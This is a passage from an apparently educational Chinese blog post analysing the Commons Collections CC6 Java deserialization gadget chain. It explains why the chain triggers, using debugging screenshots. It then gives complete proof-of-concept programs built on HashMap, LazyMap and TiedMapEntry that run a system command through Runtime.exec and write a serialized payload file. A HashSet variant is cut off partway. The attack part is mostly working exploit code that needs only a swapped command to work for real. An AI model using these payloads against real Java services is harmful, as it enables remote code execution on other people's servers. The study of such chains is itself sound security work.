TiedMapEntry对象的分析，如下面的hm变量。开始没想那么多，单纯新建了一个hashmap对象想去触发漏洞，直到在学习分析思路二的时候，回过头看到代码，有个疑惑“为啥要多建立一个hashmap对象去触发，已经有一个hashmap对象了(如下面代码的map变量)，直接用map变量去put进TiedMapEntry对象不就行了”</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>然后将代码改成下面过后，本以为效果还是一样的，但运行过后发现，如果不要<code>map.remove(11);</code>即不删除map中key为11的元素，依旧能反序列化触发漏洞，而上面分析中新建hashmap对象去put进TiedMapEntry对象的话，必须要删除第一个hashmap对象中的key为11元素才能触发。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">map.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//map.remove(11);</span></span><br></pre></td></tr></table></figure><p>在调试过程中也发现运行完<code>map.put(TM,111);</code>后，也添加了key为11的元素，此时ma已经存在key为11的元素</p><p><img src="/posts/9758c0a8/cc6-20.png" title="map元素"></p><p>那在反序列化的时候，在触发漏洞点时不是应该<code>map.containsKey(key)</code>值为true吗，为什么实际运行结果是false然后触发漏洞</p><p><img src="/posts/9758c0a8/cc6-21.png" title="判断条件"></p><p>调试找下原因，<code>hashmap</code>重写了反序列化<code>readObject</code>，那在反序列化处打断点看看怎么读取数据的。<br><code>readObject</code>的前面部分代码就是获取一些序列化流的一些信息，然后在创建node节点，读取流中的map信息，依次把key和value进行put还原。<br>在关键读取map中下断点</p><p><img src="/posts/9758c0a8/cc6-22.png" title="断点分析"></p><p>可以看到第一个读取还原的<code>Map</code>元素，<code>key</code>为<code>TiedMapEntry</code>，<code>value</code>为<code>111</code></p><p><img src="/posts/9758c0a8/cc6-23.png" title="第一次还原元素"></p><p>读出来后，进行<code>putVal()</code>写入还原<code>hashmap</code>，其中会有<code>hash(key)</code>操作，跟进hash</p><p><img src="/posts/9758c0a8/cc6-24.png" title="hash操作"></p><p>然后调用到<code>hashCode()</code>,跟进<code>hashCode()</code>,调用<code>getValue()</code>,再跟进<code>getValue()</code>,进入到<code>get</code>方法中</p><p><img src="/posts/9758c0a8/cc6-25.png" title="get方法"></p><p>进入到判断体中，触发漏洞</p><p><img src="/posts/9758c0a8/cc6-26.png" title="触发漏洞"></p><p>可以看到当前的table表中没有任何元素，因此能进入判断体中触发漏洞，然后再Put添加元素</p><p><img src="/posts/9758c0a8/cc6-27.png" title="table表"></p><p>然后再跳过断点，回到主循环体，这时候读取第二组元素，此时的Key为11，然后再进行put操作</p><p><img src="/posts/9758c0a8/cc6-28.png" title="读取第二组元素"></p><p>至此，简述就是反序列化过程中，最先读取到<code>map</code>的<code>key</code>为<code>TiedMapEntry</code>的元素，然后进行<code>put</code>时由于<code>map</code>中没有存在<code>key</code>为<code>11</code>的元素，因此能够触发漏洞，触发完漏洞过后再还原写入<code>key</code>为<code>11</code>的元素。</p><p>同hashmap对象操作能触发的原因找到了，再看看不同hashmap对象操作时，同样不删除key为11的元素，为什么就不行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>同样下断点，此时读取的元素&lt;key,value&gt;为(11,11)，不是上面情况的<code>key</code>为<code>TiedMapEntry</code>的元素，因此最开始就读取key为11的元素写入到map中，自然不会触发漏洞了</p><p><img src="/posts/9758c0a8/cc6-29.png" title="读取元素"></p><p>如果添加<code>map.remove(11);</code>删除key为11的步骤，在反序列化时读取的map元素就为<code>TiedMapEntry</code>元素，就能正常触发漏洞。</p><p><img src="/posts/9758c0a8/cc6-30.png" title="读取元素"></p><p>至此，原因找到了，但第二种情况为什么先还原的key为11，我的猜测：<br>第二种情况，由于第一个hashmap对象先创建，对第二个hashmap对象进行put操作，编译序列化写入的时候按顺序将第一个hashmap对象先写入此时已经将编译完成的值写入，导致在反序列化读取的时候第一个hashmap对象已经存在key为11的元素；而第一种情况，对同一个hashmap对象进行操作，顺序也是先Put进TiedMapEntry为Key，触发漏洞后，再创建put一个key为11的元素，所以序列化时第一个还原key为TiedMapEntry的map元素。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h4><p>通过上面遇到的疑惑，同hashmap对象也能触发漏洞，就得到了第二个poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(TM,<span class="number">111</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h4><p>上面学习的时候通过反射修改链转换器来实现本地序列化时触发的代码执行，还可以通过反射修改hashmap的key值，达到规避本地触发的问题。<br>hashmap底层通过table表将map的键值对存储到table表的node节点对象中，修改hashmap的key值，实际就是修改table中的key值</p><p>先通过反射获取hashmap的table表属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(map);</span><br></pre></td></tr></table></figure><p>然后获取table表中存在key的元素，也就是要修改的元素，由于不同环境下key值存在的序号不同，就写了个循环去查找避免找不到，比如我这序号是13</p><p><img src="/posts/9758c0a8/cc6-31.png" title="读取元素"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后反射更改key值为触发对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化即可，得到完整POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(map);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-32.png" title="读取元素"></p><h3 id="实现思路二：HashSet"><a href="#实现思路二：HashSet" class="headerlink" title="实现思路二：HashSet"></a>实现思路二：HashSet</h3><h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>另外一种实现通过HashSet进行调用，先看看HashSet是干嘛的</p><blockquote><p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。<br>HashSet 允许有 null 值。<br>HashSet 是无序的，即不会记录插入的顺序。<br>HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。 您必须在多线程访问时显式同步对 HashSet 的并发访问。<br>HashSet 实现了 Set 接口。</p></blockquote><p>简述就是HashSet是一个无序且无重复元素的集合，只有Key值（可以理解为value值固定的hashmap），HashMap为键值对key-value形式。</p><p><img src="/posts/9758c0a8/cc6-15.png" title="HashSet"></p><p>其中会内置一个<code>transient</code>类型的<code>hashmap-map</code>变量，构造方法会自动对<code>map</code>对象进行<code>hashmap</code>实例化。</p><p>回到利用链来，上面的时候分析到<code>hashmap</code>在<code>put</code>元素时，将<code>TiedMapEntry</code>对象<code>put</code>进<code>map</code>中，在对元素进行<code>hash()</code>时会自动调用<code>TiedMapEntry.hashCode()</code>方法，达到执行代码的目的。</p><p>因此重点就在<code>hashmap</code>的<code>put</code>操作，就找<code>HashSet</code>在哪对<code>map</code>对象进行了put操作，且<code>put</code>的<code>key</code>得我们可控才行。</p><p>发现<code>HashSet</code>中，<code>add</code>操作调用了，重写的<code>readObject</code>中也调用了</p><p><img src="/posts/9758c0a8/cc6-17.png" title="add"></p><p><code>add</code>操作相当于<code>hashmap</code>把<code>value</code>值固定了，然后把传入<code>key</code>进行<code>put</code>操作，底层上还是<code>hashmap</code>的操作，然后实现方法同样，<code>put</code>值就能触发。</p><p><img src="/posts/9758c0a8/cc6-18.png" title="实现方法"></p><p>再看序列化和反序列化，虽然其中的<code>map</code>变量是<code>transient</code>修饰的，无法对<code>map</code>进行序列化，但序列化过程会遍历<code>map</code>中元素，把元素写入流中，再通过反序列化把流写入新的<code>hashmap</code>的<code>map</code>中。</p><p><img src="/posts/9758c0a8/cc6-16.png" title="readObject中put"></p><p>在<code>HashSet</code>中重写的<code>readObject</code>中对<code>map</code>进行了<code>put</code>操作，对反序列化的操作注解写在里面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断底层hashmap流容量</span></span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断加载因子，通俗就是说查看该map的装入的元素会不会超过设定的加载大小，例如容量大小为16，加载因子设置为0.5，就是装入元素为8个，超过8个就超过了设置的预期值，用来设置预期装入的容量大小。</span></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断底层hashmap流大小</span></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                             size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面条件都满足就急计算底层hashmap流的实际可容量</span></span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建上述条件下的hashmap对象，用来写入</span></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//循环读取元素然后put入hashmap的map中</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看下来基本不需要去绕过上面的限制，默认情况下都是满足条件的，只需要对序列化的对象进行反序列化读取，然后写入到map中，接下来再去看序列化写入，看写入的参数是否可控。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//对非static或transient类型的数据进行写入</span></span><br><span class="line">        <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的容量和加载因子写入</span></span><br><span class="line">        <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的大小写入</span></span><br><span class="line">        <span class="comment">// Write out size</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把map中元素依次进行写入</span></span><br><span class="line">        <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然<code>map</code>为<code>transient</code>类型无法序列化，但写入过程基本把<code>map</code>的信息读取出来依次写入流中，再通过反序列化读取重新写入到新的<code>hashmap</code>对象中。</p><h4 id="POC-1-1"><a href="#POC-1-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>通过上面的学习，发现同思路一的poc，把入口点换成<code>HashSet</code>，相当于多走了一步弯路，思路一中直接通过<code>hashmap</code>对象<code>put</code>值进行触发，这通过<code>hashset</code>进行<code>add</code>值去触发<code>hashmap.put</code>进行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        <span class="comment">//通过HashSet add值去触发漏洞</span></span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(TM);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span 